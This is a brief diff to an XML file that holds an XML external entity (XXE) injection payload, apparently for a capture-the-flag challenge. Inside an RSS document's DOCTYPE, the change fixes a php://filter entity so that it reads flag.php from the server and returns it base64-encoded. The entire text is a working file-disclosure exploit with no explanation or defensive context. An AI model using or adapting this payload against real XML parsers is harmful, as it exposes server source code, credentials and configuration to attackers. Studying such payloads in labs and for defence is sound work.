@@ -1,7 +1,7 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE title [  
    <!ELEMENT title ANY >
-   <!ENTITY xxe SYSTEM "php://filter/convert.base64-decode|convert.base64-encode/resource=flag.php" >]>
+   <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=flag.php" >]>
 <rss version="2.0">
 
 <channel>
